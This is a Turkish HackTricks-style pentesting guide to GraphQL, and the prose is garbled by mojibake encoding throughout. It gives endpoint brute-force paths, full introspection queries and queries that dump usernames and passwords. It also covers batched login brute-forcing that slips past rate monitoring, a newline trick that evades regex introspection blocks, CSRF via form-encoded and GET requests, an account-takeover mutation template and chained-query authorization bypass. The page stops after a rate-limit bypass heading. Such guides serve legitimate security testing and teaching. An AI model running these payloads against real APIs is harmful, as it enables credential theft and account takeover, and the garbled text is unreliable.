# GraphQL

<details>

<summary><strong>AWS hackleme becerilerinizi sÄ±fÄ±rdan kahraman seviyesine Ã§Ä±karÄ±n</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>ile</strong>!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## GiriÅŸ

GraphQL, backend'den veri sorgulamak iÃ§in REST API'ye **verimli bir alternatif** olarak Ã¶ne Ã§Ä±kar ve geliÅŸtiricilerin veri alÄ±m sÃ¼reÃ§lerinin karmaÅŸÄ±klÄ±ÄŸÄ±nÄ± azaltarak tÃ¼m gereken bilgileri **tek bir istekte** almayÄ± mÃ¼mkÃ¼n kÄ±lar. REST'in aksine, verileri toplamak iÃ§in Ã§eÅŸitli uÃ§ noktalara yapÄ±lan Ã§ok sayÄ±da istek gerektiren durumlarda, GraphQL tÃ¼m gereken bilgileri tek bir istekte almayÄ± saÄŸlar. Bu basitleÅŸtirme, veri alÄ±m sÃ¼reÃ§lerinin karmaÅŸÄ±klÄ±ÄŸÄ±nÄ± azaltarak geliÅŸtiricilere Ã¶nemli Ã¶lÃ§Ã¼de fayda saÄŸlar.

## GraphQL ve GÃ¼venlik

GraphQL gibi yeni teknolojilerin ortaya Ã§Ä±kmasÄ±yla birlikte yeni gÃ¼venlik aÃ§Ä±klarÄ± da ortaya Ã§Ä±kar. Dikkate alÄ±nmasÄ± gereken Ã¶nemli bir nokta, **GraphQL'Ä±n varsayÄ±lan olarak kimlik doÄŸrulama mekanizmalarÄ±nÄ± iÃ§ermemesidir**. Bu tÃ¼r gÃ¼venlik Ã¶nlemlerini uygulamak geliÅŸtiricilerin sorumluluÄŸundadÄ±r. DoÄŸru kimlik doÄŸrulama olmadan, GraphQL uÃ§ noktalarÄ± kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ kullanÄ±cÄ±lara hassas bilgileri aÃ§Ä±klayabilir ve ciddi bir gÃ¼venlik riski oluÅŸturabilir.

### Dizin Brute Force SaldÄ±rÄ±larÄ± ve GraphQL

AÃ§Ä±ÄŸa Ã§Ä±karÄ±lmÄ±ÅŸ GraphQL Ã¶rneklerini belirlemek iÃ§in dizin brute force saldÄ±rÄ±larÄ±na belirli yollarÄ±n dahil edilmesi Ã¶nerilir. Bu yollar ÅŸunlardÄ±r:

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

AÃ§Ä±k GraphQL Ã¶rneklerini belirlemek, desteklenen sorgularÄ±n incelenmesine olanak tanÄ±r. Bu, uÃ§ noktadan eriÅŸilebilen verileri anlamak iÃ§in Ã¶nemlidir. GraphQL'in introspeksiyon sistemi, bir ÅŸemanÄ±n desteklediÄŸi sorgularÄ± detaylandÄ±rarak bu iÅŸlemi kolaylaÅŸtÄ±rÄ±r. Bu konuda daha fazla bilgi iÃ§in GraphQL introspeksiyonu hakkÄ±nda belgelere baÅŸvurun: [**GraphQL: API'ler iÃ§in bir sorgu dili.**](https://graphql.org/learn/introspection/)

### Parmak Ä°zi

[**graphw00f**](https://github.com/dolevf/graphw00f) aracÄ±, bir sunucuda kullanÄ±lan GraphQL motorunu tespit edebilir ve gÃ¼venlik denetÃ§isi iÃ§in bazÄ± yardÄ±mcÄ± bilgileri yazdÄ±rabilir.

#### Evrensel sorgular <a href="#universal-queries" id="universal-queries"></a>

Bir URL'nin bir GraphQL servisi olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in **evrensel bir sorgu**, `query{__typename}`, gÃ¶nderilebilir. YanÄ±tta `{"data": {"__typename": "Query"}}` yer alÄ±yorsa, URL'nin bir GraphQL uÃ§ noktasÄ± barÄ±ndÄ±rdÄ±ÄŸÄ± onaylanÄ±r. Bu yÃ¶ntem, GraphQL'in sorgulanan nesnenin tÃ¼rÃ¼nÃ¼ ortaya Ã§Ä±karan `__typename` alanÄ±na dayanÄ±r.
```javascript
query{__typename}
```
### Temel Saptama

Graphql genellikle **GET**, **POST** (x-www-form-urlencoded) ve **POST**(json) destekler. Ancak gÃ¼venlik iÃ§in yalnÄ±zca json'a izin vermek, CSRF saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in Ã¶nerilir.

#### Ä°Ã§gÃ¶rÃ¼

Åema bilgilerini keÅŸfetmek iÃ§in iÃ§gÃ¶rÃ¼yÃ¼ kullanmak iÃ§in `__schema` alanÄ±nÄ± sorgulayÄ±n. Bu alan, tÃ¼m sorgularÄ±n kÃ¶k tÃ¼rÃ¼nde mevcuttur.
```bash
query={__schema{types{name,fields{name}}}}
```
Bu sorgu ile kullanÄ±lan tÃ¼m tiplerin adÄ±nÄ± bulabilirsiniz:

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Bu sorgu ile tÃ¼m tipleri, alanlarÄ± ve argÃ¼manlarÄ± (ve argÃ¼manlarÄ±n tÃ¼rÃ¼nÃ¼) Ã§Ä±karabilirsiniz. Bu, veritabanÄ±nÄ± sorgulamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ±zÄ± bilmek iÃ§in Ã§ok faydalÄ± olacaktÄ±r.

![](<../../.gitbook/assets/image (207) (3).png>)

**Hatalar**

**HatalarÄ±n** gÃ¶sterilip gÃ¶sterilmeyeceÄŸini bilmek ilginÃ§ olacaktÄ±r Ã§Ã¼nkÃ¼ bunlar faydalÄ± **bilgiler** saÄŸlayacaktÄ±r.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (205) (1).png>)

**Ä°ntrospeksiyon Yoluyla VeritabanÄ± ÅemasÄ±nÄ± SÄ±ralama**

{% hint style="info" %}
EÄŸer introspeksiyon etkinleÅŸtirilmiÅŸse ancak yukarÄ±daki sorgu Ã§alÄ±ÅŸmÄ±yorsa, sorgu yapÄ±sÄ±ndan `onOperation`, `onFragment` ve `onField` direktiflerini kaldÄ±rmayÄ± deneyin.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Tek satÄ±r iÃ§i sorgu:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Son kod satÄ±rÄ±, graphql'den tÃ¼m meta bilgileri (nesne adlarÄ±, parametreler, tipler...) dÃ¶kecek bir graphql sorgusudur.

![](<../../.gitbook/assets/image (206).png>)

EÄŸer introspection etkinse, [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) kullanarak tÃ¼m seÃ§enekleri bir GUI'de gÃ¶rÃ¼ntÃ¼leyebilirsiniz.

### Sorgulama

VeritabanÄ±nda hangi tÃ¼r bilgilerin kaydedildiÄŸini bildiÄŸimize gÃ¶re, bazÄ± deÄŸerleri **Ã§Ä±karmayÄ± deneyelim**.

Introspection'da **doÄŸrudan sorgulayabileceÄŸiniz nesneyi** bulabilirsiniz (Ã§Ã¼nkÃ¼ bir nesneyi sadece var olduÄŸu iÃ§in sorgulayamazsÄ±nÄ±z). AÅŸaÄŸÄ±daki resimde "_queryType_"'Ä±n "_Query_" olarak adlandÄ±rÄ±ldÄ±ÄŸÄ±nÄ± ve "_Query_" nesnesinin bir alanÄ±nÄ±n "_flags_" olduÄŸunu gÃ¶rebilirsiniz, bu alan da bir nesne tÃ¼rÃ¼dÃ¼r. Bu nedenle flag nesnesini sorgulayabilirsiniz.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Sorgu "_flags_"'Ä±n tÃ¼rÃ¼nÃ¼n "_Flags_" olduÄŸuna dikkat edin ve bu nesnenin aÅŸaÄŸÄ±daki gibi tanÄ±mlandÄ±ÄŸÄ±nÄ± gÃ¶rebilirsiniz:

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

"_Flags_" nesnelerinin **ad** ve **deÄŸer** ile oluÅŸturulduÄŸunu gÃ¶rebilirsiniz. ArdÄ±ndan, tÃ¼m bayraklarÄ±n adlarÄ±nÄ± ve deÄŸerlerini aÅŸaÄŸÄ±daki sorgu ile alabilirsiniz:
```javascript
query={flags{name, value}}
```
Not: **Sorgulanacak nesne**, aÅŸaÄŸÄ±daki Ã¶rnekte olduÄŸu gibi **string** gibi **ilkel bir tÃ¼r** ise, sadece sorgulayabilirsiniz:
```javascript
query={hiddenFlags}
```
BaÅŸka bir Ã¶rnekte, "_Query_" tÃ¼rÃ¼ nesnesi iÃ§inde "_user_" ve "_users_" adÄ±nda 2 nesne vardÄ±. Bu nesnelerin arama iÃ§in herhangi bir argÃ¼mana ihtiyacÄ± olmadÄ±ÄŸÄ±nda, istediÄŸiniz verileri sormak suretiyle **tÃ¼m bilgileri alabilirsiniz**. Bu Ã¶rnekte, Ä°nternet'ten kaydedilmiÅŸ kullanÄ±cÄ± adlarÄ±nÄ± ve ÅŸifreleri Ã§Ä±karabilirsiniz:

![](<../../.gitbook/assets/image (208).png>)

Ancak, bu Ã¶rnekte bunu yapmaya Ã§alÄ±ÅŸÄ±rsanÄ±z, ÅŸu **hata**yÄ± alÄ±rsÄ±nÄ±z:

![](<../../.gitbook/assets/image (210).png>)

GÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re, "_**uid**_" tÃ¼rÃ¼nde bir "_**uid**_" argÃ¼manÄ± kullanarak arama yapacak gibi gÃ¶rÃ¼nÃ¼yor. Neyse ki, zaten bunu biliyorduk, [Temel NumaralandÄ±rma](graphql.md#basic-enumeration) bÃ¶lÃ¼mÃ¼nde bize gerekli tÃ¼m bilgileri gÃ¶steren bir sorgu Ã¶nerilmiÅŸti: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Bu sorguyu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mda saÄŸlanan gÃ¶rÃ¼ntÃ¼yÃ¼ okursanÄ±z, "_**user**_"'Ä±n _Int_ tÃ¼rÃ¼nde "_**uid**_" adÄ±nda bir **arg**'ye sahip olduÄŸunu gÃ¶receksiniz.

Bu nedenle, hafif bir _**uid**_ brute force yaparak _**uid**=**1**_ iÃ§in bir kullanÄ±cÄ± adÄ± ve ÅŸifre elde ettim:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Dikkat edin, "_**user**_" ve "_**password**_" parametrelerini sormak iÃ§in **keÅŸfettiÄŸimi** fark ettim, Ã§Ã¼nkÃ¼ mevcut olmayan bir ÅŸeyi aramaya Ã§alÄ±ÅŸÄ±rsam (`query={user(uid:1){noExists}}`), bu hatayÄ± alÄ±rÄ±m:

![](<../../.gitbook/assets/image (213).png>)

Ve **numaralandÄ±rma aÅŸamasÄ±** sÄ±rasÄ±nda "_**dbuser**_" nesnesinin "_**user**_" ve "_**password**_" alanlarÄ±na sahip olduÄŸunu keÅŸfettim.

**Sorgu dizesi dÃ¶kÃ¼m hilesi (teÅŸekkÃ¼rler @BinaryShadow\_)**

EÄŸer bir dize tÃ¼rÃ¼yle arama yapabilirseniz, Ã¶rneÄŸin: `query={theusers(description: ""){username,password}}` ve **boÅŸ bir dize** ararsanÄ±z, tÃ¼m verileri **dÃ¶kÃ¼mleyecektir**. (_Bu Ã¶rnek, Ã¶ÄŸreticilerin Ã¶rneÄŸiyle ilgili deÄŸildir, bu Ã¶rnekte "**theusers**" kullanarak bir String alan olan "**description**" ile arama yapabileceÄŸinizi varsayalÄ±m_).

### Arama

Bu yapÄ±landÄ±rmada, bir **veritabanÄ±** kiÅŸileri ve filmleri iÃ§erir. **KiÅŸiler** e-posta ve isimleriyle tanÄ±mlanÄ±r; **filmler** ise adlarÄ± ve derecelendirmeleriyle tanÄ±mlanÄ±r. **KiÅŸiler**, birbirleriyle arkadaÅŸ olabilir ve ayrÄ±ca veritabanÄ± iÃ§indeki iliÅŸkileri gÃ¶steren filmlere sahip olabilir.

KiÅŸileri **isimlerine gÃ¶re arayabilir** ve e-postalarÄ±nÄ± alabilirsiniz:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
KiÅŸileri **isim** ile **arama** yapabilir ve **abone olduklarÄ±** **filmleri** alabilirsiniz:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Not: KiÅŸinin `aboneFilmler`inin `adÄ±nÄ±` almak iÃ§in nasÄ±l belirtildiÄŸine dikkat edin.

AynÄ± zamanda **birkaÃ§ nesneyi aynÄ± anda arayabilirsiniz**. Bu durumda, 2 film aramasÄ± yapÄ±lÄ±r:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ya da hatta **Ã§eÅŸitli farklÄ± nesnelerin iliÅŸkilerini takma adlar kullanarak**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutasyonlar

**Mutasyonlar, sunucu tarafÄ±nda deÄŸiÅŸiklik yapmak iÃ§in kullanÄ±lÄ±r.**

**Ä°nceleme** iÃ§inde **tanÄ±mlanan** **mutasyonlarÄ±** bulabilirsiniz. AÅŸaÄŸÄ±daki resimde "_MutationType_" "_Mutation_" olarak adlandÄ±rÄ±lÄ±r ve "_Mutation_" nesnesi, mutasyonlarÄ±n adlarÄ±nÄ± iÃ§erir (bu durumda "_addPerson_" gibi):

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

Bu yapÄ±da, bir **veritabanÄ±** kiÅŸileri ve filmleri iÃ§erir. **KiÅŸiler** e-posta ve isimleriyle tanÄ±mlanÄ±r; **filmler** ise adlarÄ± ve derecelendirmeleriyle tanÄ±mlanÄ±r. **KiÅŸiler**, birbirleriyle arkadaÅŸ olabilir ve aynÄ± zamanda veritabanÄ±ndaki iliÅŸkileri gÃ¶steren filmlere sahip olabilir.

VeritabanÄ±na yeni filmler eklemek iÃ§in bir mutasyon aÅŸaÄŸÄ±daki gibi olabilir (bu Ã¶rnekte mutasyon `addMovie` olarak adlandÄ±rÄ±lmÄ±ÅŸtÄ±r):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Not: Hem deÄŸerlerin hem de veri tÃ¼rÃ¼nÃ¼n sorguda belirtildiÄŸine dikkat edin.**

AyrÄ±ca, veritabanÄ± mevcut **arkadaÅŸlar** ve **filmler** ile birlikte **kiÅŸilerin** oluÅŸturulmasÄ±na izin veren `addPerson` adÄ±nda bir **mutasyon** iÅŸlemi desteklemektedir. Yeni oluÅŸturulan kiÅŸiye baÄŸlantÄ± yapmadan Ã¶nce arkadaÅŸlar ve filmlerin veritabanÄ±nda Ã¶nceden var olmasÄ± gerektiÄŸini unutmak Ã¶nemlidir.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### 1 API isteÄŸinde toplu kaba kuvvet saldÄ±rÄ±sÄ±

Bu bilgi [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/) adresinden alÄ±nmÄ±ÅŸtÄ±r.\
**FarklÄ± kimlik bilgileriyle birlikte birÃ§ok sorguyu aynÄ± anda gÃ¶ndererek** GraphQL API Ã¼zerinden kimlik doÄŸrulama yapÄ±lÄ±r ve kontrol edilir. Bu klasik bir kaba kuvvet saldÄ±rÄ±sÄ±dÄ±r, ancak GraphQL toplu iÅŸleme Ã¶zelliÄŸi sayesinde bir HTTP isteÄŸiyle birden fazla giriÅŸ/ÅŸifre Ã§ifti gÃ¶ndermek mÃ¼mkÃ¼ndÃ¼r. Bu yaklaÅŸÄ±m, harici hÄ±z izleme uygulamalarÄ±nÄ± yanÄ±ltarak her ÅŸeyin yolunda olduÄŸunu ve ÅŸifreleri tahmin etmeye Ã§alÄ±ÅŸan bir kaba kuvvet saldÄ±rÄ±sÄ± botunun olmadÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼ndÃ¼rebilir.

AÅŸaÄŸÄ±da, **aynÄ± anda 3 farklÄ± e-posta/ÅŸifre Ã§iftiyle** uygulama kimlik doÄŸrulama isteÄŸinin en basit gÃ¶sterimi bulunmaktadÄ±r. AynÄ± ÅŸekilde tek bir istekte binlerce gÃ¶ndermek mÃ¼mkÃ¼ndÃ¼r:

![](<../../.gitbook/assets/image (182) (1).png>)

YanÄ±t ekran gÃ¶rÃ¼ntÃ¼sÃ¼nden gÃ¶rebileceÄŸimiz gibi, ilk ve Ã¼Ã§Ã¼ncÃ¼ istekler _null_ dÃ¶ndÃ¼rdÃ¼ ve ilgili bilgileri _error_ bÃ¶lÃ¼mÃ¼nde yansÄ±ttÄ±. **Ä°kinci mutasyon doÄŸru kimlik doÄŸrulama** verilerine sahipti ve yanÄ±tta doÄŸru kimlik doÄŸrulama oturum belirteci bulunmaktadÄ±r.

![](<../../.gitbook/assets/image (119) (1).png>)

## Introspection Olmadan GraphQL

Daha fazla **graphql uÃ§ noktasÄ± introspection'Ä± devre dÄ±ÅŸÄ± bÄ±rakÄ±yor**. Bununla birlikte, graphql'in beklenmeyen bir istek aldÄ±ÄŸÄ±nda attÄ±ÄŸÄ± hatalar, [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) gibi araÃ§larÄ±n Ã§oÄŸu ÅŸemayÄ± yeniden oluÅŸturmak iÃ§in yeterlidir.

AyrÄ±ca, Burp Suite uzantÄ±sÄ± [**GraphQuail**](https://github.com/forcesunseen/graphquail) GraphQL API isteklerini izler ve her yeni sorguyu gÃ¶rdÃ¼ÄŸÃ¼nde dahili bir GraphQL ÅŸemasÄ± **oluÅŸturur**. AyrÄ±ca, GraphiQL ve Voyager iÃ§in ÅŸemayÄ± aÃ§Ä±ÄŸa Ã§Ä±karabilir. UzantÄ±, bir introspection sorgusu aldÄ±ÄŸÄ±nda sahte bir yanÄ±t dÃ¶ndÃ¼rÃ¼r. SonuÃ§ olarak, GraphQuail API iÃ§inde kullanÄ±labilecek tÃ¼m sorgularÄ±, argÃ¼manlarÄ± ve alanlarÄ± gÃ¶sterir. Daha fazla bilgi iÃ§in [**burayÄ± kontrol edin**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

[**GraphQL varlÄ±klarÄ±nÄ± keÅŸfetmek iÃ§in gÃ¼zel bir kelime listesi burada bulunabilir**](https://github.com/Escape-Technologies/graphql-wordlist?).

### GraphQL introspection savunmalarÄ±nÄ± aÅŸma <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **GraphQL Introspection SavunmalarÄ±nÄ± AÅŸma**

API'lerde introspection sorgularÄ±na getirilen kÄ±sÄ±tlamalarÄ± aÅŸmak iÃ§in, `__schema` anahtarÄ±ndan sonra **Ã¶zel bir karakter eklemek** etkilidir. Bu yÃ¶ntem, introspection'Ä± engellemek iÃ§in `__schema` anahtarÄ±na odaklanan regex desenlerinde yaygÄ±n olarak gÃ¶rÃ¼len geliÅŸtirici hatalarÄ±nÄ± sÃ¶mÃ¼rÃ¼r. GraphQL'in gÃ¶rmezden geldiÄŸi ancak regex'te hesaba katÄ±lmamÄ±ÅŸ olabilecek karakterler olan **boÅŸluklar, yeni satÄ±rlar ve virgÃ¼ller** ekleyerek kÄ±sÄ±tlamalarÄ± atlayabilirsiniz. Ã–rneÄŸin, `__schema`'dan sonra bir satÄ±r sonu ekleyen bir introspection sorgusu, bu tÃ¼r savunmalarÄ± atlayabilir:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
BaÅŸarÄ±sÄ±z olursanÄ±z, yalnÄ±zca POST isteklerine uygulanan kÄ±sÄ±tlamalar nedeniyle **GET istekleri** veya **`x-www-form-urlencoded` ile POST** gibi alternatif istek yÃ¶ntemlerini dÃ¼ÅŸÃ¼nÃ¼n.

### **AÃ§Ä±ÄŸa Ã‡Ä±kmÄ±ÅŸ GraphQL YapÄ±larÄ±nÄ± KeÅŸfetme**

Introspection devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ±nda, JavaScript kÃ¼tÃ¼phanelerinde Ã¶nceden yÃ¼klenmiÅŸ sorgularÄ± incelemek, web sitesinin kaynak kodunu incelemek iÃ§in kullanÄ±ÅŸlÄ± bir stratejidir. Bu sorgular, geliÅŸtirici araÃ§larÄ±ndaki `Kaynaklar` sekmesi kullanÄ±larak bulunabilir ve API'nin ÅŸemasÄ± hakkÄ±nda bilgi saÄŸlayabilir, potansiyel olarak **aÃ§Ä±ÄŸa Ã§Ä±kmÄ±ÅŸ hassas sorgularÄ±** ortaya Ã§Ä±karabilir. GeliÅŸtirici araÃ§larÄ± iÃ§inde arama yapmak iÃ§in kullanÄ±lan komutlar:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQL'de CSRF

CSRF'nin ne olduÄŸunu bilmiyorsanÄ±z, aÅŸaÄŸÄ±daki sayfayÄ± okuyun:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Orada, **CSRF belirteÃ§leri olmadan yapÄ±landÄ±rÄ±lmÄ±ÅŸ** birÃ§ok GraphQL uÃ§ noktasÄ± bulabileceksiniz.

GraphQL istekleri genellikle **`application/json`** iÃ§erik tÃ¼rÃ¼nÃ¼ kullanarak POST istekleri aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilir.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Ancak, Ã§oÄŸu GraphQL uÃ§ noktasÄ± ayrÄ±ca **`form-urlencoded` POST isteklerini** destekler:
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Bu nedenle, Ã¶nceki gibi CSRF istekleri **Ã¶niÅŸlem istekleri olmadan** gÃ¶nderildiÄŸinden, bir CSRF'yi istismar ederek GraphQL'de **deÄŸiÅŸiklikler yapmak mÃ¼mkÃ¼ndÃ¼r**.

Ancak, Chrome'un `samesite` bayraÄŸÄ±nÄ±n yeni varsayÄ±lan Ã§erez deÄŸeri `Lax` olduÄŸunu unutmayÄ±n. Bu, Ã§erezin yalnÄ±zca GET isteklerinde Ã¼Ã§Ã¼ncÃ¼ taraf bir web sitesinden gÃ¶nderileceÄŸi anlamÄ±na gelir.

AyrÄ±ca, **sorgu isteÄŸini** **GET** **isteÄŸi** olarak da gÃ¶ndermek genellikle mÃ¼mkÃ¼ndÃ¼r ve CSRF belirteci GET isteÄŸinde doÄŸrulanmayabilir.

AyrÄ±ca, kullanÄ±cÄ±nÄ±n kimlik bilgilerini istismar ederek GraphQL uÃ§ noktasÄ±ndan iÃ§erik sÄ±zdÄ±rmak iÃ§in [**XS-Search**](../../pentesting-web/xs-search.md) **saldÄ±rÄ±sÄ±nÄ±** kullanmak da mÃ¼mkÃ¼n olabilir.

Daha fazla bilgi iÃ§in [**buradaki orijinal yazÄ±ya**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html) bakÄ±n.

## GraphQL'de Yetkilendirme

UÃ§ noktada tanÄ±mlanan birÃ§ok GraphQL iÅŸlevi, yalnÄ±zca istemcinin kimlik doÄŸrulamasÄ±nÄ± kontrol edebilir, ancak yetkilendirmeyi kontrol etmeyebilir.

Sorgu giriÅŸ deÄŸiÅŸkenlerini deÄŸiÅŸtirmek, hassas hesap ayrÄ±ntÄ±larÄ±nÄ±n [sÄ±zdÄ±rÄ±lmasÄ±na](https://hackerone.com/reports/792927) neden olabilir.

Mutasyon, baÅŸka bir hesap verisini deÄŸiÅŸtirmeye Ã§alÄ±ÅŸarak hesap ele geÃ§irmeye bile yol aÃ§abilir.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### GraphQL'de yetkilendirme atlamak

[Query'leri zincirleme](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) zayÄ±f bir yetkilendirme sistemi atlayabilir.

AÅŸaÄŸÄ±daki Ã¶rnekte, iÅŸlemin "forgotPassword" olduÄŸunu ve yalnÄ±zca onunla iliÅŸkili forgotPassword sorgusunun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± gerektiÄŸini gÃ¶rebilirsiniz. Bu, sona bir sorgu ekleyerek atlatÄ±labilir, bu durumda "register" ve sistem tarafÄ±ndan yeni bir kullanÄ±cÄ± olarak kaydedilmek Ã¼zere bir kullanÄ±cÄ± deÄŸiÅŸkeni ekliyoruz.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## GraphQL'de Takma AdlarÄ± Kullanarak HÄ±z SÄ±nÄ±rlarÄ±nÄ± Atlatma

